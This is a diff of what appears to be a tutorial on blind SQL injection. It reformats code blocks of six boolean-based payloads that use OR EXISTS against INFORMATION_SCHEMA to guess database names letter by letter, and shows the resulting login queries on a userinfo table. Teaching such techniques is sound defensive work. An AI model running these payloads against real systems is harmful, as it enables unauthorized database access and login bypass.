@@ -255,19 +255,24 @@ We can now use this magical operator to ask the server yes or no questions and f
 ```sql
 # Query 1
 ' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 's%' AND TABLE_SCHEMA != 'information_schema') #
-
+```
+```sql
 # Query 2
 ' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 't%' AND TABLE_SCHEMA != 'information_schema') #
-
+```
+```sql
 # Query 3
 ' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'u%' AND TABLE_SCHEMA != 'information_schema') #
-
+```
+```sql
 # Query 4
 ' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'tt%' AND TABLE_SCHEMA != 'information_schema') #
-
+```
+```sql
 # Query 5
 ' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'tz%' AND TABLE_SCHEMA != 'information_schema') #
-
+```
+```sql
 # Query 6
 ' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'tu%' AND TABLE_SCHEMA != 'information_schema') #
 ```
@@ -277,19 +282,24 @@ Resultant queries:
 ```sql
 # Query 1
 SELECT * FROM userinfo WHERE Username='bar' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 's%' AND TABLE_SCHEMA != 'information_schema') #'
-
+```
+```sql
 # Query 2
 SELECT * FROM userinfo WHERE Username='bar' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 't%' AND TABLE_SCHEMA != 'information_schema') #'
-
+```
+```sql
 # Query 3
 SELECT * FROM userinfo WHERE Username='bar' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'u%' AND TABLE_SCHEMA != 'information_schema') #'
-
+```
+```sql
 # Query 4
 SELECT * FROM userinfo WHERE Username='bar' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'tt%' AND TABLE_SCHEMA != 'information_schema') #'
-
+```
+```sql
 # Query 5
 SELECT * FROM userinfo WHERE Username='bar' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'tz%' AND TABLE_SCHEMA != 'information_schema') #'
-
+```
+```sql
 # Query 6
 SELECT * FROM userinfo WHERE Username='bar' AND Password='' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE 'tu%' AND TABLE_SCHEMA != 'information_schema') #'
 ```
